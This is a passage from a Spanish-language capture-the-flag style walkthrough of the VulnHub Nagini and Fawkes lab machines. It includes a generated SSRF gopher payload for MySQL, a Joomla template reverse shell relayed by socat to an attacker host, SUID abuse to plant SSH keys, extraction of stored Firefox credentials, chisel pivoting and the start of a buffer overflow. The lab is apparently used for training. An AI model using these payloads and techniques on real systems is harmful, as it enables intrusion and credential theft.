Vemos cosas interesantes. El panel de administrador está expuesto y localizamos un archivo `configuration.php.bak`. Con la herramienta `wget` y utilizando `proxychains` nos descargamos el archivo .bak

```bash
❯ proxychains wget http://10.10.0.135/joomla/configuration.php.bak
ProxyChains-3.1 (http://proxychains.sf.net)
--2023-02-12 18:23:23--  http://10.10.0.135/joomla/configuration.php.bak
Conectando con 10.10.0.135:80... |S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.135:80-<><>-OK
conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 1978 (1,9K) [application/x-trash]
Grabando a: «configuration.php.bak»

configuration.php.bak                               100%[==================================================================================================================>]   1,93K  --.-KB/s    en 0s      

2023-02-12 18:23:23 (442 MB/s) - «configuration.php.bak» guardado [1978/1978]
```

Examniando el archivo .bak vemos unas credenciales para una base de datos

<img src="/assets/VH/eCPPTv2-Lab/credentials.png">

En este punto nos viene a la cabeza la herramienta [Gopherus](https://github.com/tarunkant/Gopherus) que se aprovecha de sitios vulnerables a SSRF. Esta herramienta sólo es válida cuando cuando no está protegido por contraseña que es nuestro caso. Ejecutamos herramienta pasándole el parámetro `--exploit mysql` y proporcionamos usuario y query a ejecutar

```bash
❯ gopherus --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

		author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: goblin
Give query to execute: show databases;

Your gopher link is ready to do SSRF : 

gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%10%00%00%00%03%73%68%6f%77%20%64%61%74%61%62%61%73%65%73%3b%01%00%00%00%01

-----------Made-by-SpyD3r-----------
```

El payload generado lo copiamos en la web vulnerable a SSRF que encontramos anteriormente, ejecutamos y refrescamos la página hasta que nos muestre la información deseada

<img src="/assets/VH/eCPPTv2-Lab/databases.png">

Ya sabemos que la base de datos se llama `joomla`. Seguimos enumerando tablas con la query `USE joomla; show tables;`

<img src="/assets/VH/eCPPTv2-Lab/tables.png">

Localizamos la tbala `joomla_users`. Enumeramos columnas de la tabla con la query `USE joomla; describe joomla_users;`

<img src="/assets/VH/eCPPTv2-Lab/columns.png">

Encontramos usuario `site_admin` y una contraseña hasheada. tratamos de romper el hash con john pero no lo conseguimos.

<img src="/assets/VH/eCPPTv2-Lab/dump.png">

Si tenemos privilegios podemos cambiar la contraseña del usuario `site_admin`. Aplicamos `md5` para hashear la password que queramos actualizar y en la herramineta Gopherus y la query `USE joomla; update joomla_users set password='482c811da5d5b4bc6d497ffa98491e38' where username='site_admin';` probamos a ver si tenemos capacidad de alterar la password

```bash
❯ echo -n "password123" | md5sum
482c811da5d5b4bc6d497ffa98491e38
```

<img src="/assets/VH/eCPPTv2-Lab/change.png">

Con la contraseña cambiada nos dirigimos al panel de administrador en `/joomla/administrator` y accedemos con la password que acabamos de cambiar

<img src="/assets/VH/eCPPTv2-Lab/joomla.png">

Una vez hemos ganado acceso al panel de administración de Joomla nos dirigimos a `Extensions -> Templates -> Templates -> Protostar Details and Files` y editamos la plantilla `error.php` e insertamos código para entablar reverse shell con la máquina atacante. Hay que mencionar que como no tenemos conexión directa con nuestra máquina debemos enviar la reverse shell al nodo más cercano, en este caso es la máquina `Aragog(10.10.0.134)` y con la herramienta socat redirigimos el tráfico a nuestra máquina atacante puesto que desde la máquina Aragog si tenemos conectividad con nuestra máquina atacante

<img src="/assets/VH/eCPPTv2-Lab/joomlashell.png">

```bash
#ARAGOG
root@Aragog:/tmp# ./socat TCP-LISTEN:1111,fork TCP:192.168.1.148:443
```

Nos ponemos en escucha por el pueto 443 en nuestro equipo y tratamos de acontecer un error deliberadamente en el CMS joomla para que nos cargue el recurso `error.php` y así ejecute nuestro código malicioso

```bash
❯ sudo nc -nlvp 443
[sudo] password for yorch: 
listening on [any] 443 ...
connect to [192.168.1.148] from (UNKNOWN) [192.168.1.142] 56018
bash: cannot set terminal process group (690): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Nagini:/var/www/html/joomla$ hostname -I
hostname -I
192.168.100.129 10.10.0.135 
```

Comprobamos que estamos dentro de la máquina `Nagini` y vemos que existe otro segmento de red con IP 192.168.100.129. Dentro de la ruta `/var/www/html` encontramos otro Horocrux

```bash
www-data@Nagini:/var/www/html$ cat horcrux1.txt 
horcrux_{MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O}
www-data@Nagini:/var/www/html$ echo "MzogU2x5dGhFcmlOJ3MgTG9jS0VldCBkRXN0cm9ZZUQgYlkgUm9O" | base64 -d; echo
3: SlythEriN's LocKEet dEstroYeD bY RoN
```

### Movimiento Lateral I (Nagini)

* * *

Dentro del directorio home vemos las carpetas personales de los usuarios `snape` y `hermoine`. Accedemos al directorio de snape y vemos un archivo `.creds.txt`, listamos su contenido y vemos una cadena en base64, decodoficamos y obtenemos credenciales de snape. Migramos de usuario con credenciales obtenidas

```bash
www-data@Nagini:/home/snape$ ls -la
total 32
drwxr-xr-x 4 snape snape 4096 Apr  4  2021 .
drwxr-xr-x 4 root  root  4096 Apr  4  2021 ..
-rw-r--r-- 1 snape snape  220 Apr  3  2021 .bash_logout
-rw-r--r-- 1 snape snape 3526 Apr  3  2021 .bashrc
-rw-r--r-- 1 snape snape   17 Apr  4  2021 .creds.txt
drwx------ 3 snape snape 4096 Apr  4  2021 .gnupg
-rw-r--r-- 1 snape snape  807 Apr  3  2021 .profile
drwx------ 2 snape snape 4096 Apr  4  2021 .ssh
www-data@Nagini:/home/snape$ cat .creds.txt 
TG92ZUBsaWxseQ==
www-data@Nagini:/home/snape$ echo "TG92ZUBsaWxseQ==" | base64 -d; echo
Love@lilly
www-data@Nagini:/home/snape$ su snape
Password: 
snape@Nagini:~$
```

### Movimiento Lateral II (Nagini)

* * *

Accedemos al directorio de `hermoine` y vemos una carpeta `bin`. Dentro de la carpeta bin hay un binario `su_cp` con privilegios SUID. El binario parece ser una copia de `cp`

```bash
nape@Nagini:/home/hermoine/bin$ ls -la
total 152
drwxr-xr-x 2 hermoine hermoine   4096 Apr  4  2021 .
drwxr-xr-x 6 hermoine hermoine   4096 Apr  4  2021 ..
-rwsr-xr-x 1 hermoine hermoine 146880 Apr  4  2021 su_cp
```

Nos copiamos el contenido de la clave `id_rsa.pub` que generamos anteriormente en la resolución de la máquina Aragog a un archivo `authorized_keys` en la carpeta `/tmp` y con el binario `su_cp` lo copiamos en la carpeta `.ssh` de hermione

```bash
snape@Nagini:/home/hermoine/bin$ ./su_cp /tmp/authorized /home/hermoine/.ssh/authorized_keys
```
Ahora con la herramienta `ssh` a tarvés de `proxychains` podemos conectarnos sin contraseña a la máquina `Nagini` con el usuario `hermoine`

```bash
❯ proxychains ssh hermoine@10.10.0.135
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.135:22-<><>-OK
Linux Nagini 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Apr  4 16:43:01 2021 from ::1
hermoine@Nagini:~$ whoami
hermoine
```

En la carpeta personal de hermoine tenemos otro Horocrux

```bash
hermoine@Nagini:~$ ls
bin  horcrux2.txt
hermoine@Nagini:~$ cat horcrux2.txt 
horcrux_{NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=}
hermoine@Nagini:~$ echo "NDogSGVsZ2EgSHVmZmxlcHVmZidzIEN1cCBkZXN0cm95ZWQgYnkgSGVybWlvbmU=" | base64 -d;echo
4: Helga Hufflepuff s Cup destroyed by Hermione
```

### Escalada de Privilegios (Nagini)

* * *

Listamos el contenido del directorio personal de hermoine y vemos un directorio oculto `.mozilla`. Accedemos a `/.mozilla/firefox` y vemos un directorio `g2mhbq0o.default` que corresponde a un perfil. Dentro de este directorio vemos el archivo `key4.db` y `logins.json` que con la herramienta [firepwd](https://github.com/lclevy/firepwd) podemos extraer credenciales almacenadas en texto claro

Para transferirnos los archivos tendremos que hacer uso de la herramienta socat en la máquina Aragog para redirigir el tráfico a nuestro equipo

<img src="/assets/VH/eCPPTv2-Lab/logins.png">
<img src="/assets/VH/eCPPTv2-Lab/key4.png">

Con los dos archivos necesarios dentro de la carpeta de `firepwd` ejecutamos y extraemos credenciales en texto claro del usuario root

```bash
❯ python3 firepwd.py
globalSalt: b'db8e223cef34f55b9458f52286120b8fb5293c95'
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'2065c62fe9dc4d8352677299cc0f2cb8'
 }
entrySalt: b'0bce4aaf96a7014248b28512e528c9e9a75c30f2'
b'70617373776f72642d636865636b0202'
password check? True
 SEQUENCE {
   SEQUENCE {
     OBJECTIDENTIFIER 1.2.840.113549.1.12.5.1.3 pbeWithSha1AndTripleDES-CBC
     SEQUENCE {
       OCTETSTRING b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
       INTEGER b'01'
     }
   }
   OCTETSTRING b'ceedd70a1cfd8295250bcfed5ff49b6c878276b968230619a2c6c51aa4ea5c8e'
 }
entrySalt: b'11c73a5fe855de5d96e9a06a8503019d00efa9e4'
b'233bb64646075d9dfe8c464f94f4df235234d94f4c2334940808080808080808'
decrypting login/password pairs
http://nagini.hogwarts:b'root',b'@Alohomora#123'
```

Con la contraseña obtenida podemos migrar al usuario root y visualizar el útlimo horocrux en la carpeta `/root`

```bash
root@Nagini:~# cat horcrux3.txt 
  ____                            _         _       _   _                 
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \|  _ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/                                                   


Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Medium
Machine Name: Nagini
Horcruxes Hidden in this VM: 3 horcruxes

You have successfully pwned Nagini machine.
Here is your third hocrux: horcrux_{NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=}




# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com

root@Nagini:~# echo "NTogRGlhZGVtIG9mIFJhdmVuY2xhdyBkZXN0cm95ZWQgYnkgSGFycnk=" | base64 -d;echo
5: Diadem of Ravenclaw destroyed by Harry
```

Para ganar persistencia copiaremos nuestra clave `id_rsa.pub` a un archivo `authorized_keys` en la carpeta `.ssh` de root

Hemos completado la máquina **Nagini** de VulnHub!! Happy Hacking!!

### Reconocimiento (Fawkes)

* * *

Técnicas Vistas (Nagini): 

- **EXTRA: Running chisel as a client from the Nagini machine to reach the Fawkes machine**
- **EXTRA: Creating a new socks5 connection through a new port**
- **EXTRA: FTP connection in passive mode when going through proxychains**
- **Binary Enumeration - Buffer Overflow (x32) Stack Based**
- **EXTRA: Execution of the Buffer Overflow sending the reverse shell through 2 machines until it reaches us**
- **Abusing Sudoers Privilege in a container**
- **Intercepting the traffic with tcpdump - Discovering credentials in FTP authentication**
- **SSH Credential Reuse - Escaping the Container**
- **Abusing sudo 1.8.27 version (CVE-2021-3156) [Privilege Escalation]**

Iniciamos el reconocimiento de la máquina `Fawkes`. Necesitamos saber su IP y los puertos abiertos que tiene esta máquina. Para ello nos haremos un pequeño script en bash el cual nos ayudará con la tarea. Sabiendo que la IP de la máquina nagini en el segmento es 192.168.100.129 vamos a escanear todas las IP en el segmento `192.168.100.0/24`

```bash
root@Nagini:~# hostname -I
192.168.100.129 10.10.0.135  
```

```bash
#!/bin/bash

for i in $(seq 1 254); do
        timeout 1 bash -c "ping -c 1 192.168.100.$i" &>/dev/null && echo "[+] Host 192.168.100.$i - ACTIVO" &
done; wait
```
```bash
root@Nagini:/tmp# ./hostDiscovery.sh 
[+] Host 192.168.100.1 - ACTIVO
[+] Host 192.168.100.129 - ACTIVO
[+] Host 192.168.100.130 - ACTIVO
[+] Host 192.168.100.131 - ACTIVO
```
Ya sabemos que la IP de la máquina `Fawkes` es la 192.168.100.130. Ahora procedemos a enumerar los puertos abiertos mediante otro script en bash

```bash
#!/bin/bash

for port in $(seq 1 65535); do
        timeout 1 bash -c "echo '' > /dev/tcp/192.168.100.130/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
done; wait
```

```bash
root@Nagini:/tmp# ./portDiscovery.sh 
[+] Port 21 - OPEN
[+] Port 22 - OPEN
[+] Port 80 - OPEN
[+] Port 2222 - OPEN
[+] Port 9898 - OPEN
```

A partir de este punto para trabajar más cómodamente vamos a crear un túnel por el cual nos vamos a poder acceder a la máquina `Fawkes` desde nuestra equipo atacante a pesar de no tener conexión directa al no estar en el mismo segmento. Para esta tarea utilizaremos la herarmienta `chisel` la cual debemos subir a la máquina `Nagini` que es la que está en el mismo segmento que la `Aragog` en donde nos haremos servir de la herramienta `socat` para redirigir el flujo de conexión a nuestra máquina atacante donde tenemos funcionando `chisel` en modo servidor. Los ejecutaremos de la siguiente forma

```bash
#NAGINI
root@Nagini:/tmp# ./chisel client 10.10.0.134:2322 R:8888:socks

#ARAGOG
root@Aragog:/tmp# ./socat TCP-LISTEN:2322,fork TCP:192.168.1.148:1234
```

Deberemos modificar el archivo `/etc/proxychains.conf`. Comentamos la línea `strict_chain` y descomentamos `dynamic_chain` e incluir el nuevo túnel con el puerto 8888 

```bash
❯ cat /etc/proxychains.conf
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/proxychains.conf
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ # proxychains.conf  VER 3.1
.
.
.
dynamic_chain
.
#strict_chain
.
.
socks5 127.0.0.1 8888
socks5 127.0.0.1 1080
```

Para tener alcance a esta máquina por el navegador crearemos una nueva norma en FoxyProxy agregando el nuevo túnel

<img src="/assets/VH/eCPPTv2-Lab/fawkestunel.png">

Accediendo por el navegador a la IP de la máquina `Fawkes` ya tenemos alcance

<img src="/assets/VH/eCPPTv2-Lab/fawkesweb.png">

Seguimos realizando un escaneo de puertos con `nmap` para confirmar los encontrados anteriormente con el script en bash

```bash
❯ seq 1 65535 | xargs -P 500 -I {} proxychains nmap -sT -Pn -p{} -open -T5 -v -n 192.168.100.130 2>&1 | grep "tcp open"
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
2222/tcp open  EtherNetIP-1
9898/tcp open  monkeycom
```

### Reconocimiento FTP (Fawkes)

* * *

Iniciamos el reconocimiento del puerto 21. Tratamos de conectarnos de forma anónima al servicio. Nos lo permite pero si tratamos de ejecutar algún comando nos indica un error. Esto es debido a que como estamos trabajando por túneles puede generar conflictos. Para solucionarlo debemos ejecutar el comando `passive` para entrar en modo pasivo

```bash
❯ proxychains ftp 192.168.100.130
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:8888-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.130:21-<><>-OK
Connected to 192.168.100.130.
220 (vsFTPd 3.0.3)
Name (192.168.100.130:yorch): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
500 Illegal PORT command.
ftp> passive
Passive mode on.
ftp> dir
227 Entering Passive Mode (192,168,100,130,211,220).
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.130:54236-<><>-OK
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0          705996 Apr 12  2021 server_hogwarts
```

Encontramos un archivo `server_hogwarts`. Entramos en modo binario por si se tratara de un archivo binario y nos lo traemos a nuestro equipo para examinarlo detalladamente

```bash
ftp> binary
200 Switching to Binary mode.
ftp> get server_hogwarts
local: server_hogwarts remote: server_hogwarts
227 Entering Passive Mode (192,168,100,130,127,11).
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.130:32523-<><>-OK
150 Opening BINARY mode data connection for server_hogwarts (705996 bytes).
```

Se trata de un binario de 32 Bits compilado. Lo ejecutamos aparentemente no hace nada. Con la ayuda de la herramienta `strace` podemos ver que acciones está realizando el binario y parece que está levantando un servidor en el puerto 9898

```bash
❯ file server_hogwarts
server_hogwarts: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1d09ce1a9929b282f26770218b8d247716869bd0, for GNU/Linux 3.2.0, not stripped
❯ strace ./server_hogwarts
execve("./server_hogwarts", ["./server_hogwarts"], 0x7ffdb247b580 /* 37 vars */) = 0
[ Process PID=122493 runs in 32 bit mode. ]
brk(NULL)                               = 0x9fce000
brk(0x9fce7c0)                          = 0x9fce7c0
set_thread_area({entry_number=-1, base_addr=0x9fce2c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
uname({sysname="Linux", nodename="parrot", ...}) = 0
readlink("/proc/self/exe", "/home/yorch/Labs/VulnHub/Fawkes/"..., 4096) = 52
brk(0x9fef7c0)                          = 0x9fef7c0
brk(0x9ff0000)                          = 0x9ff0000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No existe el fichero o el directorio)
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
setsockopt(3, SOL_SOCKET, SO_REUSEPORT, [1], 4) = 0
bind(3, {sa_family=AF_INET, sin_port=htons(9898), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
```

Ejecutamos la aplicación y con netcat nos conectamos a localhost por el puerto 9898

```bash
❯ nc localhost 9898
Welcome to Hogwart s magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: 
```

Recordemos que la máquina `Fawkes` tiene el puerto 9898 lo que nos da a entender que el binario encontrado está funcionando en ese puerto de la máquina víctima. Obtenemos el mismo resultado 

```bash
❯ proxychains nc 192.168.100.130 9898
ProxyChains-3.1 (http://proxychains.sf.net)
|D-chain|-<>-127.0.0.1:8888-<>-127.0.0.1:1080-<--timeout
|D-chain|-<>-127.0.0.1:8888-<><>-192.168.100.130:9898-<><>-OK
Welcome to Hogwart s magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: 
```
Suponiendo que a nivel de input tiene asignado un búffer de tamaño determinado y no está sanitizado, podemos tratar de introducir un input mayor del tamaño esperado y observar si el binario se corrompe lo que nos lleva a pensar en un BOF (BufferOverflow)

```bash
#SERVER
❯ ./server_hogwarts
zsh: segmentation fault  ./server_hogwarts

#CLIENT
❯ nc localhost 9898
Welcome to Hogwart s magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

### BufferOverflow (Fawkes)

* * *

Utilizaremos la herramienta `gdb` para iniciar el proceso de debbuging. Ejecutamos el binario a través de la herramienta `gdb` y volvemos a introducir un payload en el input con muchas `A`. Obervamos que los registros `eip` y `ebp` se ha sobreescrito con las letras A que hemos introducido

```bash
❯ gdb ./server_hogwarts -q
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 10.1.90.20210103-git in 0.00ms using Python engine 3.9
Reading symbols from ./server_hogwarts...
(No debugging symbols found in ./server_hogwarts)
gef➤  r
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffccec  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffd2b0  →  "our spell: "
$edx   : 0xffffd0f4  →  "our spell: "
$esp   : 0xffffcd60  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x80b3158  →  "../csu/libc-start.c"
$edi   : 0xffffd2a8  →  "\nEnter your spell: "
$eip   : 0x41414141 ("AAAA"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcd60│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	← $esp
0xffffcd64│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcd68│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcd6c│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcd70│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcd74│+0x0014: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcd78│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcd7c│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server_hogwarts", stopped 0x41414141 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Eneste punto tenemos que saber en qué punto se sobreescribe el `eip`. Nos serviremos de un comando de la apliación `gdb` el cual nos crea un patrón de 1024 caracteres

```bash
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaa